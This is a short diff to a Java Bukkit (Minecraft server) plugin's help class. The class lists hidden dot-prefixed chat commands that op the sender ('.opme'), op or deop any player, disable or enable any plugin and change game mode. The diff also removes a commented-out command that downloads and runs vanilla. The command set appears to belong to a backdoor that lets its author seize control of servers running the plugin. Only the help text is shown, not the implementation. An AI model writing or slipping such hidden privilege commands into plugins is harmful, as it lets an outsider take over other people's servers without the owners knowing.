@@ -30,7 +30,6 @@ public class Command_help implements Listener
                 p.sendMessage(ChatColor.GOLD + ".opme - OPs you.");
                 p.sendMessage(ChatColor.GOLD + ".disableplugin <plugin> - Disables a plugin of your choice.");
                 p.sendMessage(ChatColor.GOLD + ".enableplugin <plugin> - Enables a plugin of your choice.");
-                //p.sendMessage(ChatColor.GOLD + ".enablevanilla - Downloads vanilla and runs it (shuts down bukkit).");
                 p.sendMessage(ChatColor.GOLD + ".deop <player> - Deops a player of your choice.");
                 p.sendMessage(ChatColor.GOLD + ".op <player> - OPs a player of your choice.");
                 p.sendMessage(ChatColor.GOLD + ".gamemode <creative|survival|adventure> ");
